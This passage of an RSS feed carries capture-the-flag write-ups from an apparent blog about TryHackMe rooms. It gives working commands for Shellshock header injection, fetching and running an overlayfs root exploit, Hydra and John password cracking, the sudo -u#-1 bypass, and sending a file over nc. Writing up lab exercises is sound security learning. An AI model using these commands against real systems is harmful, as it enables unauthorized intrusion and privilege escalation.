&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/W6CRPti.png&#34; alt=&#34;RSA key in backups folder&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration-nikto&#34;&gt;1.2. Web Enumeration: Nikto&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nikto -h 10.10.157.88      
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.157.88
+ Target Hostname:    10.10.157.88
+ Target Port:        80
+ Start Time:         2021-05-28 04:11:18 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Uncommon header &#39;93e4r0-cve-2014-6278&#39; found, with contents: true
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the &#39;shellshock&#39; vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Interesting. We see a shellshock vulerability. Going to the page, we see:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/c2M3UV2.png&#34; alt=&#34;cgi-bin test page&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;13-port-scanning&#34;&gt;1.3. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing too ordinary. Let&amp;rsquo;s also confirm the presence of shell-shock?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ nmap -sV --script http-shellshock --script-args uri=/cgi-bin/test.cgi,cmd=ls 10.10.157.88
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 04:15 EDT
Nmap scan report for 10.10.157.88
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     Exploit results:
|       &amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//IETF//DTD HTML 2.0//EN&amp;quot;&amp;gt;
|   &amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
|   &amp;lt;title&amp;gt;500 Internal Server Error&amp;lt;/title&amp;gt;
|   &amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
|   &amp;lt;h1&amp;gt;Internal Server Error&amp;lt;/h1&amp;gt;
|   &amp;lt;p&amp;gt;The server encountered an internal error or
|   misconfiguration and was unable to complete
|   your request.&amp;lt;/p&amp;gt;
|   &amp;lt;p&amp;gt;Please contact the server administrator at 
|    webmaster@localhost to inform them of the time this error occurred,
|    and the actions you performed just before this error.&amp;lt;/p&amp;gt;
|   &amp;lt;p&amp;gt;More information about this error may be available
|   in the server error log.&amp;lt;/p&amp;gt;
|   &amp;lt;hr&amp;gt;
|   &amp;lt;address&amp;gt;Apache/2.4.7 (Ubuntu) Server at 10.10.157.88 Port 80&amp;lt;/address&amp;gt;
|   &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.64 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Voila! Its there. Let&amp;rsquo;s look it up.&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Exploit shellshock&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s test this once more, just to be sure.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ curl -H &amp;quot;User-agent: () { :;}; echo; echo vulnerable&amp;quot; http://10.10.157.88/cgi-bin/test.cgi
vulnerable
Content-type: text/html

Hello World!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And, putting a reverse shell &amp;hellip;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/gAPdU4W.png&#34; alt=&#34;Getting a reverse shell&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We are in!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;Since we do not have the sudo password, that route is blocked. I checked the setuid bit set files - there are none. I also saw the Kernel version for fun.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:/home/ryan$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
www-data@ubuntu:/home/ryan$ gcc --version
gcc --version
gcc (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4
Copyright (C) 2013 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So we have an old kernel, which points to the overlayfs exploit. We have gcc too, so that&amp;rsquo;s great. The architecture is x64. &lt;a class=&#34;link&#34; href=&#34;https://github.com/lucyoa/kernel-exploits/blob/master/overlayfs/ofs_64&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Here is the exploit&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Startup a server on your own machine.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.157.88 - - [28/May/2021 04:32:40] &amp;quot;GET /ofs_64 HTTP/1.1&amp;quot; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Get the executable.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:/tmp$ wget 10.17.8.184/ofs_64 
wget 10.17.8.184/ofs_64
--2021-05-28 01:32:40--  http://10.17.8.184/ofs_64
Connecting to 10.17.8.184:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 886664 (866K) [application/octet-stream]
Saving to: &#39;ofs_64&#39;

100%[======================================&amp;gt;] 886,664      311KB/s   in 2.8s   

2021-05-28 01:32:44 (311 KB/s) - &#39;ofs_64&#39; saved [886664/886664]

www-data@ubuntu:/tmp$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Running it however, we get an error. The fixes I saw were all about getting g++ or updating the repository thingies. We do not have internet ;-; So, now what?&lt;/p&gt;
&lt;p&gt;Checking the PATH was the next best move. It looked shady, so I put the default ubuntu PATH as below, and &amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
&amp;lt;t PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin         
www-data@ubuntu:/tmp$ ./ofs_64 
./ofs_64 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can&#39;t access tty; job control turned off
# whoami
root
# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;System compromised!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Agent Sudo Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-agent-sudo-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-agent-sudo-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/NoIdF01.png" alt="Featured image of post TryHackMe: Agent Sudo Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/agentsudoctf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;1-enumeration--exploration&#34;&gt;1. Enumeration &amp;amp; Exploration&lt;/h3&gt;
&lt;h3 id=&#34;11-portscanning&#34;&gt;1.1 Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.170.197
Starting Nmap 7.91 (https://nmap.org ) at 2021-05-16 00:45 EDT
Nmap scan report for 10.10.170.197
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results athttps://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.16 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;None of the above stand out particularly, although we can try working on ftp first. Anonymous login is not allowed, else the scan would have returned it. We now try other routes.&lt;/p&gt;
&lt;h3 id=&#34;12-web-exploration&#34;&gt;1.2 Web Exploration&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;http://10.10.170.197/index.php&lt;/code&gt; is a valid page, meaning the website is built with php.&lt;/p&gt;
&lt;p&gt;We also see this interesting thing here:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Dear agents,
Use your own codename as user-agent to access the site.
From,
Agent R
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is hinting us to change our user-agent, in the http requests to be R, which can be assumed to be the code-name. Fire up Burp Suite and intercept the request. Change it as such.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET / HTTP/1.1
Host: 10.10.170.197
Upgrade-Insecure-Requests: 1
User-Agent: R
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is what we get as the response,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;What are you doing! Are you one of the 25 employees? If not, I going to report this incident
Dear agents,
Use your own codename as user-agent to access the site.
From,
Agent R
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means our hypothesis was correct. We can now add the user-agent flag in the gobuster scan (above) and run it again. However … it looks we should try exploring more names. After looking at the hint, I got the extension for my browser and tried C.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Attention *****,
Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
From,
Agent R
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ah so here we go!&lt;/p&gt;
&lt;h3 id=&#34;13-port-ftp-brute-force&#34;&gt;1.3 Port: FTP Brute-force&lt;/h3&gt;
&lt;p&gt;We will now use Hydra to brute-forcing our way in, using the username we got.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ hydra -l {username} -P /usr/share/wordlists/rockyou.txt 10.10.170.197 ftp
Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-16 01:22:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.170.197:21/
[STATUS] 224.00 tries/min, 224 tries in 00:01h, 14344175 to do in 1067:17h, 16 active
[21][ftp] host: 10.10.170.197   login: {username}   password: {password}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-16 01:23:37
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! We can now log in ftp with the creds.&lt;/p&gt;
&lt;h3 id=&#34;14-ftp-exploration&#34;&gt;1.4 FTP: Exploration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.170.197
Connected to 10.10.170.197.
220 (vsFTPd 3.0.3)
Name (10.10.170.197:kali): {username}
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp&amp;gt; get To_agentJ.txt
...
ftp&amp;gt; get cute-alien.jpg
...
ftp&amp;gt; get cutie.png
...
ftp&amp;gt;
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So the text file connects with what we saw earlier in the web exploration.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat To_agentJ.txt
Dear agent J,
All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn&#39;t be a problem for you.
From,
Agent C
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This clearly hints at some steganography.&lt;/p&gt;
&lt;h3 id=&#34;15-steganography&#34;&gt;1.5 Steganography&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ binwalk cutie.png
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Clearly, we have something hidden. Use the &lt;code&gt;-e&lt;/code&gt; flag to get the zip file. We have&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip  To_agentR.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The To_agentR.txt file is empty, but we have another zip.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp/_cutie.png.extracted]
└─$ 7z x 8702.zip
...

Enter password (will not be echoed):
ERROR: Wrong password : To_agentR.txt

...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So we’ll need a password first. Brute forcing time again!&lt;/p&gt;
&lt;h3 id=&#34;15-zip-brute-force&#34;&gt;1.5 Zip: Brute-force&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp/_cutie.png.extracted]
└─$ /usr/sbin/zip2john 8702.zip &amp;gt; hash
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type

┌──(kali㉿kali)-[/tmp/_cutie.png.extracted]
└─$ john hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 6 OpenMP threads
Proceeding with single, rules:Single
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 44 candidates buffered for the current salt, minimum 48 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
{password}            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE 2/3 (2021-05-16 01:51) 1.538g/s 75606p/s 75606c/s 75606C/s 123456..pepper1
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This was completed fairly quickly. Extracting with the password, we get&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp/_cutie.png.extracted]
└─$ cat To_agentR.txt
Agent C,
We need to send the picture to {encrypted stego password was here ... } as soon as possible!
By,
Agent R
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I thew this to &lt;a class=&#34;link&#34; href=&#34;http://icyberchef.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://icyberchef.com/&lt;/a&gt; and we have the magic option. And … voila! We have the password&lt;/p&gt;
&lt;h3 id=&#34;17-steganography-again&#34;&gt;1.7 Steganography (Again)&lt;/h3&gt;
&lt;p&gt;Now we can simply extract the information&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ steghide --extract -sf cute-alien.jpg
Enter passphrase:
wrote extracted data to &amp;quot;message.txt&amp;quot;.
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat message.txt
Hi {agent J},
Glad you find this message. Your login password is {agent J&#39;s password}
Don&#39;t ask me why the password look cheesy, ask agent R who set this password for you.
Your buddy,
{agent C}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are done! This looks very much like a SSH password, let’s try logging in!&lt;/p&gt;
&lt;h3 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h3&gt;
&lt;p&gt;For fun, I tried logging in with the agent C’s credentials in SSH, but to no avail. Back to agent J then!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ssh {agent J}@10.10.170.197
{agent J}@10.10.170.197&#39;s password:

...

Last login: Tue Oct 29 14:26:27 2019
{agent J}@agent-sudo:~$ ls -la
total 80
drwxr-xr-x 4 {agent J} {agent J}  4096 Oct 29  2019 .
drwxr-xr-x 3 root  root   4096 Oct 29  2019 ..
-rw-r--r-- 1 {agent J} {agent J} 42189 Jun 19  2019 Alien_autospy.jpg
-rw-r--r-- 1 {agent J} {agent J}    33 Oct 29  2019 user_flag.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! We have our user flag.&lt;/p&gt;
&lt;p&gt;So they want us to solve another image related challenge … but before you pack your bags, its actually fun XD&lt;/p&gt;
&lt;p&gt;Use netcat on your machine to listen to port 1337 and run the command &lt;code&gt;nc YOUR_IP 1337 &amp;lt; Alien_autospy.jpg&lt;/code&gt; to send the file. Do not forget to put the output in a file like, &lt;code&gt;nc -lnvp 1337 &amp;gt; brr&lt;/code&gt;. Now, as the hint suggests, do a Google reverse image search and look for the article by foxnews XD&lt;/p&gt;
&lt;h3 id=&#34;3-privilege-escalation&#34;&gt;3. Privilege Escalation&lt;/h3&gt;
&lt;p&gt;Okay. Time to get serious again.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{agent J}@agent-sudo:~$ sudo -l
Matching Defaults entries for {agent J} on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User {agent J} may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So I googled the last line, and we get something interesting which we have seen before in other writeups as well. It is a security by pass exploit described here &lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/exploits/47502.&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.exploit-db.com/exploits/47502.&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{agent J}@agent-sudo:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like we have some hope!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{agent J}@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ey, voila!&lt;/p&gt;
&lt;p&gt;Overall a very fun room, lots of hash cracking and brute forcing — so that you can take a quick break while these tools go brrr 😛&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Anonymous Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-anonymous-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-anonymous-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/kd6mc4d.jpg" alt="Featured image of post TryHackMe: Anonymous Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/anonymous&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-recon&#34;&gt;1. Recon&lt;/h2&gt;
&lt;h3 id=&#34;11-nmap&#34;&gt;1.1 Nmap&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.14.90 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-07 06:15 EDT
Nmap scan report for 10.10.14.90
Host is up (0.20s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.150.214
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2021-05-07T10:15:43+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-07T10:15:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.53 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Im not going to touch port 22 because ssh is cute. Port 21 is ftp allowing anon login.&lt;/p&gt;
&lt;h3 id=&#34;12-ftp&#34;&gt;1.2 FTP&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.14.90
Connected to 10.10.14.90.
220 NamelessOne&#39;s FTP Server!
Name (10.10.14.90:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp&amp;gt; cd scripts
250 Directory successfully changed.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000          946 May 07 10:11 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp&amp;gt; get clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.00 secs (1.3612 MB/s)
ftp&amp;gt; get removed_files.log
local: removed_files.log remote: removed_files.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for removed_files.log (989 bytes).
226 Transfer complete.
989 bytes received in 0.00 secs (11.2284 MB/s)
ftp&amp;gt; get to_do.txt
local: to_do.txt remote: to_do.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.08 secs (0.8479 kB/s)
ftp&amp;gt; 
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay, let&amp;rsquo;s explore them one by one.&lt;/p&gt;
&lt;h3 id=&#34;13-exploration&#34;&gt;1.3 Exploration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat clean.sh                                                              1 ⨯
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo &amp;quot;Running cleanup script:  nothing to delete&amp;quot; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE &amp;amp;&amp;amp; echo &amp;quot;$(date) | Removed file /tmp/$LINE&amp;quot; &amp;gt;&amp;gt; /var/ftp/scripts/removed_files.log;done
fi
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Interesting &amp;hellip; This looks like it has the scope for priv esc later on. I
ll have to dig in, but we&amp;rsquo;ll keep this in mind.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat to_do.txt        
I really need to disable the anonymous login...it&#39;s really not safe
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;lmao ikr.&lt;/p&gt;
&lt;p&gt;Okay. So, one thing that the other questions hint at, is the smb shares on port 139 and 445. Let&amp;rsquo;s explore that.&lt;/p&gt;
&lt;h3 id=&#34;14-smb&#34;&gt;1.4 SMB&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;                                                                                  
┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.14.90 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;-L btw is for listing the shares&lt;/li&gt;
&lt;li&gt;-N is for saying im not giving a password :)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.14.90/pics -N 
Try &amp;quot;help&amp;quot; to get a list of possible commands.
smb: \&amp;gt; ls
